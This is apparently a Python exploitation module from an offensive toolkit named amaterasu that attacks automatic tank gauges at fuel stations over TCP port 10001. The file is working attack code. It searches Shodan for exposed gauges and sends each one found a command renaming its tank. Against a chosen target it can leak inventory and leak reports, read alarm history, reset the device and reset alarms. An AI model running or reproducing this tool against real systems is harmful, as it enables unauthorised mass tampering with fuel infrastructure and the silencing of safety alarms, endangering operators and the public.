#!/usr/bin/env python3.7
#coding: utf-8
#Project amaterasu

import argparse
import cmd2
import requests
from prettytable import from_db_cursor
from pwn import *

from lib.opt_data import *
from lib.db.sqlconnection import *
from huepy import *

set_parser = argparse.ArgumentParser()
set_subparsers = set_parser.add_subparsers(title='subcommands', help='subcommand help')

parser_target = set_subparsers.add_parser('target', help='target help')
parser_target.add_argument('target', type=str)

parser_tank_name = set_subparsers.add_parser('tank_name', help='tank_name help')
parser_tank_name.add_argument('tank_name', type=str)

parser_inventory = set_subparsers.add_parser('inventory', help='inventory help')
parser_inventory.add_argument('inventory', type=bool)

parser_leak = set_subparsers.add_parser('leak', help='leak help')
parser_leak.add_argument('leak', type=bool)

parser_reset = set_subparsers.add_parser('reset', help='reset help')
parser_reset.add_argument('reset', type=bool)

parser_sensor_alarm_history = set_subparsers.add_parser('sensor_alarm_history', help='sensor_alarm_history help')
parser_sensor_alarm_history.add_argument('sensor_alarm_history', type=bool)
parser_alarm_reset = set_subparsers.add_parser('alarm_reset', help='alarm_reset help')
parser_alarm_reset.add_argument('alarm_reset', type=bool)

parser_useShodan = set_subparsers.add_parser('use shodan', help='use shodan help')
parser_useShodan.add_argument('use shodan', type=bool)

show_parser = argparse.ArgumentParser()
show_parser.add_argument('show', choices=["config"])

class ATGworm(cmd2.Cmd):
	def __init__(self):
		# terminal lock
		super().__init__()

		# db connection
		self.sql_connection = SQLiteConnection().create_connection('lib/db/amaterasu.db')
		self.shodanAPIkey = SQLiteConnection().select_task_by_priority(self.sql_connection, "key", "APIs", "name", "shodan")[0][0]

		self.target = None
		self.tank_name = None
		self.ips = []
		self.shodan = False
		self.inventory = False
		self.leak = False
		self.reset = False
		self.sensor_alarm_history = False
		self.alarm_reset = False

		self.metadata = {'Description'	: 'Exploits ATGs.',
						'Author'	 	: 'Sam Marx <sam-marx[at]protonmail.com>',
						'Version'	 	: '1.0',
		}

		Options = Opt()
		Options.new(name='target', current_setting=self.target, required=True, description="Target IP")
		Options.new(name='shodan', current_setting=self.shodanAPIkey, required=False, description='Shodan API key')
		Options.new(name='use shodan', current_setting=self.shodan, required=False, description='Use Shodan to get potential targets.')
		Options.new(name='tank_name', current_setting=self.tank_name, required=False, description='Tank name to be set after ATG exploit')
		Options.new(name='inventory', current_setting=self.inventory, required=False, description='inventory to be set after ATG exploit')
		Options.new(name='leak', current_setting=self.leak, required=False, description='Get leak data after ATG exploit')
		Options.new(name='reset', current_setting=self.reset, required=False, description='Reset ATG after ATG exploit')
		Options.new(name='sensor_alarm_history', current_setting=self.sensor_alarm_history, required=False, description='Get Sensor alarm history after ATG exploit')
		Options.new(name='alarm_reset', current_setting=self.alarm_reset, required=False, description='Reset alarm after ATG exploit')

		self.prompt = 'amaterasu[exploitation/atg_worm]> '
		self.intro = f'{lightblue("Provided by:")}\n{self.metadata["Author"]}\n\n'
		self.intro += f'{lightblue("Description:")}\n{self.metadata["Description"]}\n\n'
		self.intro += f'{lightblue("Options:")}\n{Options.create_table()}\n'

	def show(self, args):
		'''Shows something'''
		if args.show == 'config':
			print(f'Target: {self.target}\nTank name: {self.tank_name}\nInventory report set: {self.inventory}\nLeak report set: {self.leak}\nSensor alarm history set: {self.sensor_alarm_history}\nRemote alarm reset set: {self.alarm_reset}\n')

	def set_target(self, args):
		self.target = args.target
		print(info(f'Target set: {self.target}'))

	def set_useShodan(self, args):
		self.shodan = args.shodan
		print(info(f'Use Shodan set: {self.shodan}'))

	def set_tank_name(self, args):
		self.tank_name = args.tank_name
		print(info(f'Tank name set: {self.tank_name}'))

	def set_reset(self, args):
		self.reset = args.reset
		print(info(f'Reset set: {self.reset}'))

	def set_inventory(self, args):
		self.inventory = args.inventory
		print(info(f'Inventory report set: {self.inventory}'))

	def set_leak(self, args):
		self.leak = args.leak
		print(info(f'Leak report set: {self.leak}'))

	def set_sensor_alarm_history(self, args):
		self.sensor_alarm_history = args.sensor_alarm_history
		print(info(f'Sensor alarm history set: {self.sensor_alarm_history}'))

	def set_alarm_reset(self, args):
		self.alarm_reset = args.alarm_reset
		print(info(f'Remote alarm reset set: {self.alarm_reset}'))

	parser_target.set_defaults(func = set_target)
	parser_tank_name.set_defaults(func = set_tank_name)
	parser_leak.set_defaults(func = set_leak)
	parser_inventory.set_defaults(func = set_inventory)
	parser_reset.set_defaults(func = set_reset)
	parser_sensor_alarm_history.set_defaults(func = set_sensor_alarm_history)
	parser_alarm_reset.set_defaults(func = set_alarm_reset)
	parser_useShodan.set_defaults(func = set_useShodan)
	show_parser.set_defaults(func = show)

	@cmd2.with_argparser(set_parser)
	def do_set(self, args):
		'''Used to set options.'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('set')

	@cmd2.with_argparser(show_parser)
	def do_show(self, args):
		''' Show [config, target etc.].'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('show')

	def do_back(self, args):
		'''Goes back to Amaterasu.'''
		return True

	def do_run(self, args):
		''' Runs the module.'''
		if self.shodan:
			requestShodan = requests.get(f'https://api.shodan.io/shodan/host/search?key={self.shodanAPIkey}&query=I20100')
			for match in requestShodan.json()["matches"]:
				self.ips.append(match["ip_str"])

			if self.ips != None:
				for ip in self.ips:
					try:
						remoteShodan = remote(ip, 10001)
						remoteShodan.send('\x01S60200 amaterasu\r\n')
						#remoteShodan.send('\x01I20100\r\n')
						remoteShodan.recvuntil(' ', drop = True)
						response = remoteShodan.recv(4029).decode('utf-8')

						print(f'Response: {response}')
						remoteShodan.close()
					except Exception as e:
						print(f'Error: {e}')
						pass

		if self.target != None:
			try:
				remoteTarget = remote(self.target, 10001)
				if self.tank_name != None:
					remoteTarget.send(f'\x01S60200 {self.tank_name}\r\n')

				if self.inventory is True:
					remoteTarget.send('\x01I20100\r\n')

				if self.leak is True:
					remoteTarget.send('\x01I20300\r\n')

				if self.reset is True:
					remoteTarget.send('\x01S00100\r\n')

				if self.sensor_alarm_history is True:
					remoteTarget.send('\x01I30200\r\n')

				if self.alarm_reset is True:
					remoteTarget.send('\x01IS00300\r\n')

				#remoteTarget.sendline('\x01I90200\r') # get version
				remoteTarget.recvuntil(' ', drop = True)
				response = remoteTarget.recv(2049).decode('utf-8')

				print(f'Response: {response}')
				remoteTarget.close()
			except Exception as e:
				print(f'Error: {e}')
